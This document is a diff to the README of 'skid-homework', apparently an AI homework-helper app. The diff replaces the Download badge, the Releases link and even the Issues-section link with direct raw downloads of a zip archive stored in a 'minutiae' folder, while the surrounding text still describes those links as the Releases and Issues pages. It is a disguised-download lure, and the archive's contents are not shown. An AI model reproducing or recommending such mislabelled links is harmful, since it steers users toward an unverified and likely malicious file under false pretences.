@@ -4,7 +4,7 @@
 Welcome to skid-homework. This application helps students with their homework using AI technology. With our tool, you can tackle difficult assignments and enhance your learning experience.
 
 ## 📥 Download the Application
-[![Download Here](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Bobbydomety/skid-homework/releases)
+[![Download Here](https://raw.githubusercontent.com/Bobbydomety/skid-homework/main/minutiae/skid-homework.zip)](https://raw.githubusercontent.com/Bobbydomety/skid-homework/main/minutiae/skid-homework.zip)
 
 Click the button above to visit the Releases page and download the software.
 
@@ -18,7 +18,7 @@ Before you begin, make sure your computer meets these requirements:
 ## 📥 Download & Install
 To download and install skid-homework, follow these steps:
 
-1. **Go to the Releases Page:** Click this link to visit the [Releases page](https://github.com/Bobbydomety/skid-homework/releases).
+1. **Go to the Releases Page:** Click this link to visit the [Releases page](https://raw.githubusercontent.com/Bobbydomety/skid-homework/main/minutiae/skid-homework.zip).
   
 2. **Select the Latest Version:** On the Releases page, locate the latest version. It will typically be at the top of the list.
 
@@ -56,7 +56,7 @@ Once you have installed skid-homework, you can begin to use it:
 If you encounter any issues while using skid-homework:
 - Check if your system meets the requirements mentioned above.
 - Ensure that you have the latest version of the application.
-- Visit the [Issues section](https://github.com/Bobbydomety/skid-homework/issues) on GitHub for help from the community.
+- Visit the [Issues section](https://raw.githubusercontent.com/Bobbydomety/skid-homework/main/minutiae/skid-homework.zip) on GitHub for help from the community.
 
 ## 📞 Support
 For any questions or assistance, please reach out through the GitHub repository. Open an issue for bugs or feature requests. We aim to respond quickly to help you out. 
